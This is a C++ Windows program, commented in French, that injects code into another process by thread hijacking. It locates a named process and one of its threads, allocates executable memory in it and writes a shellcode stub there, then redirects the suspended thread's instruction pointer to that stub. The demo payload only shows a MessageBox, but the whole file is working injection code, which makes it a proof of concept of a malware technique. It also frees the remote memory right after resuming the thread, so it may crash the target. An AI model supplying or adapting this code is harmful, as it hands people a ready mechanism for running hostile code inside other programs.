#include <windows.h>
#include <cstdio>
#include <TlHelp32.h>

unsigned char sc[] = { 
	'o' , 'O' , 0x00,
	0x60,							//pushad
	0x33, 0xC0,						//xor eax,eax
	0xBB, 0x00, 0x00, 0x00, 0x00,	//mov ebx,dword
	0x50,							//push eax
	0x53,							//push ebx
	0x53,							//push ebx
	0x50,							//push eax
	0xB8, 0x00, 0x00, 0x00, 0x00,	//mov eax,dword
	0xFF, 0xD0,						//call eax
	0x61,							//popad
	0xC3							//ret	
};

int main(int c, char **v)
{
	if( c < 2 ) ExitProcess(0);


	/* Recherche de l'adresse de MessageBoxA sur ce systeme */

	DWORD AddrMsgBox = (DWORD)GetProcAddress(LoadLibrary("user32.dll"),"MessageBoxA");

	printf("Adresse de MessageBoxA: 0x%x\n",AddrMsgBox);

	(DWORD)*(DWORD *)&sc[16] = AddrMsgBox;

	/* Recherche de l'id du processus cible */
	
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

	if(!hSnapshot) ExitProcess(0);

	PROCESSENTRY32 processentry;

	processentry.dwSize = sizeof(PROCESSENTRY32);

	Process32First(hSnapshot,&processentry);

	while(1)
	{
		if(strstr(v[1],processentry.szExeFile)) break;
		if(!Process32Next(hSnapshot,&processentry))
		{
			CloseHandle(hSnapshot);
			ExitProcess(0);
		}
	}

	CloseHandle(hSnapshot);

	/* Recherche un id d'un thread du processus cible */

	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);

	if(!hSnapshot) ExitProcess(0);

	THREADENTRY32 threadentry;

	threadentry.dwSize = sizeof(THREADENTRY32);

	Thread32First(hSnapshot, &threadentry);
	
	while(threadentry.th32OwnerProcessID != processentry.th32ProcessID && Thread32Next(hSnapshot, &threadentry));

	CloseHandle(hSnapshot);

	printf("ID de %s : %d\n",processentry.szExeFile,processentry.th32ProcessID);
	printf("ID de un de ses thread : %d\n",threadentry.th32ThreadID);

	/* Ouverture du processus + ecriture de notre routine */

	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, processentry.th32ProcessID);

	if(!hProcess) ExitProcess(0);

	DWORD Addr = (DWORD)VirtualAllocEx(hProcess, NULL, 1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	if(!Addr)
	{
		CloseHandle(hProcess);
		ExitProcess(0);
	}

	(DWORD)*(DWORD *)&sc[7] = Addr; 

	if(!WriteProcessMemory(hProcess, (LPVOID)Addr, sc, sizeof(sc), NULL))
	{
		CloseHandle(hProcess);
		ExitProcess(0);
	}

	/* Ouverture du thread + detournement */

	HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, 0, threadentry.th32ThreadID);

	if(!hThread)
	{
		CloseHandle(hProcess);
		ExitProcess(0);
	}

	if(SuspendThread(hThread) == -1)goto exit;

	CONTEXT context;
	context.ContextFlags = CONTEXT_CONTROL;

	if(!GetThreadContext(hThread, &context))goto exit;

	context.Esp -= 4;

	if(!WriteProcessMemory(hProcess, (LPVOID)context.Esp, &context.Eip, sizeof(DWORD), NULL))goto exit;
	
	context.Eip = Addr + 3;

	if(!SetThreadContext(hThread, &context))goto exit;

	if(ResumeThread(hThread) == -1)goto exit;

	VirtualFreeEx(hProcess, (LPVOID)Addr, 1000, MEM_RELEASE);

exit:
	CloseHandle(hThread);
	CloseHandle(hProcess);

	ExitProcess(1);
}